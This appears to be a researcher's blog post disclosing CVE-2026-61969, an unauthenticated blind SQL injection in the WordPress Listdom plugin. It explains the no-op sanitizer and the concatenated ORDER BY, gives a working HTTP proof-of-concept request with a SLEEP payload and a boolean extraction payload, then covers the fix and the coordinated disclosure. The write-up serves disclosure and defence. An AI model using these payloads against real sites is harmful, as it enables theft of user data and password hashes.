---
title: "A Sanitizer That Sanitizes Nothing: Unauthenticated SQLi in Listdom"
date: 2026-08-13
draft: false
aliases:
  - /posts/listdom-sqli/
  - /posts/blog/cve-2026-61969/
description: "CVE-2026-61969: unauthenticated time-based blind SQL injection in the WordPress Listdom plugin through 5.6.0, via a sort parameter and a sanitizer that does nothing."
summary: "Unauthenticated blind SQLi in Listdom <= 5.6.0 through a no-op sanitizer and a string-built ORDER BY. Now assigned CVE-2026-61969."
technologies: ["wordpress", "listdom", "php", "mariadb"]
vulnerabilities: ["sqli"]
---

# A Sanitizer That Sanitizes Nothing: Unauthenticated SQLi in Listdom

**CVE-2026-61969** is assigned. Listdom is a business-directory and listings plugin, and it has one of my favourite kinds of bug: the code that was supposed to make it safe runs, looks reassuring in the diff, and does absolutely nothing. An unauthenticated visitor can read the whole database out of it, one character at a time, through a sort parameter.

Two things had to go wrong for this, and both of them did.

## At a glance

| Field | Value |
|---|---|
| CVE | [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969) |
| Software | Listdom (Business Directory & Listings) |
| Slug | `listdom` |
| Affected | `<= 5.6.0` |
| Fixed | `5.7.0` |
| Type | Unauthenticated SQL Injection (CWE-89) |
| CVSS | 9.3 Critical (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L`) |
| Privilege | None |

## Wrong thing number one: the no-op sanitizer

Listdom registers a pile of front-end AJAX actions for logged-out users, no nonce required:

```php
add_action( 'wp_ajax_nopriv_lsd_grid_load_more', array( $this, 'filter' ) );
add_action( 'wp_ajax_nopriv_lsd_grid_sort',      array( $this, 'filter' ) );
```

Inside `filter()`, there's a line that looks like it cleans the incoming attributes:

```php
$atts = $_POST['atts'] ?? [];
array_walk_recursive($atts, 'sanitize_text_field'); // does nothing useful
```

Except `array_walk_recursive` passes values *by value*. `sanitize_text_field` returns a cleaned copy, that copy is thrown on the floor, and `$atts` marches on untouched. It's a sanitizer-shaped decoration. The real value flows straight through.

## Wrong thing number two: string-built ORDER BY

The sort config comes right out of that request data:

```php
$this->sort_meta_type = isset($option['meta_type']) && trim($option['meta_type'])
    ? $option['meta_type'] : null;   // attacker-controlled
```

and `meta_type` gets concatenated into an `ORDER BY` through a `posts_clauses` filter, which sidesteps WordPress core's orderby allow-list entirely:

```php
$sanitized_type = strtoupper(preg_replace('/[^A-Z0-9_(), ]/', '', $meta_type));
$value_expression = "CAST($alias.meta_value AS $sanitized_type)"; // straight concatenation
$clauses['orderby'] = /* ... */ . $value_expression . /* ... */;
```

There's a regex here, and at a glance it looks protective. Look again at what it *keeps*: letters, digits, underscore, parentheses, comma, space. That's everything I need to break out of `CAST(... AS ...)` and bolt on functions like `SLEEP()`, `IF()`, `CASE`, `SUBSTRING()`, `ASCII()`. No quotes, no comparison operators required, because `IN (...)` does the comparisons against integers for me.

## Proof of concept

Site needs one published Listdom listing so the `ORDER BY` actually evaluates against a row. No auth, no cookies, no nonce.

Confirm it with a time delay:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=lsd_grid_load_more&atts[lsd_sorts][default][orderby]=lsd_x&atts[lsd_sorts][options][lsd_x][meta_type]=DECIMAL)%20END,%20CASE%20WHEN%20SLEEP(5)%20THEN%201%20ELSE%20(1
```

That `meta_type` decodes to `DECIMAL) END, CASE WHEN SLEEP(5) THEN 1 ELSE (1`, and the server takes about five seconds to answer. `SLEEP(0)` returns instantly, and the delay tracks the argument linearly. That's server-side SQL running.

From there it's boolean extraction. This delays only if the first character of the DB version is the digit `1`:

```
meta_type = DECIMAL) END, CASE WHEN IF(ASCII(SUBSTRING(VERSION(),1,1)) IN (49),SLEEP(4),SLEEP(0)) THEN 1 ELSE (1
```

`IN (49)` matched and took ~4s, `IN (48)` returned immediately. Walk the offsets and candidate ASCII codes and you read `VERSION()`, `DATABASE()`, `USER()`, subqueries, `INFORMATION_SCHEMA`, and on case-insensitive deployments (Windows, macOS, or MySQL with `lower_case_table_names=1`, which is a lot of managed hosting) the user table and its password hashes.

## Why it matters

No account, no interaction, and an attacker reads arbitrary data out of the WordPress database through blind extraction: user records, password hashes, secrets. Same primitive gives you a denial-of-service knob with heavy `SLEEP` expressions. Unauthenticated SQLi on a directory plugin is a bad afternoon for a lot of sites.

## The fix

Don't interpolate `meta_type`, or any request value, into SQL. Validate it against a fixed allow-list of cast types (`CHAR`, `DECIMAL`, `SIGNED`, `UNSIGNED`, `DATE`, `DATETIME`, `TIME`) and reject the rest. Stop building `ORDER BY` from a raw `posts_clauses` string. And if you're going to keep that `array_walk_recursive` line, assign the result back so it actually does something, though that's defense in depth, not the fix.

Update Listdom to **5.7.0 or later**.

## Disclosure

Found during independent research against a fresh install (WordPress 6.6 / PHP 8.2 / MariaDB 10.6 / Listdom 5.6.0) in a Docker lab. Reported through the Patchstack Bug Bounty Program.

- Reported: 29 Jun 2026
- Fixed: 5.7.0
- Published: 13 Aug 2026
- CVE: [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969)
- Advisory: [Patchstack](https://patchstack.com/database/wordpress/plugin/listdom/vulnerability/wordpress-listdom-plugin-5-6-0-sql-injection-vulnerability?_s_id=cve)

*A sanitizer you don't test is just a comment that runs.*
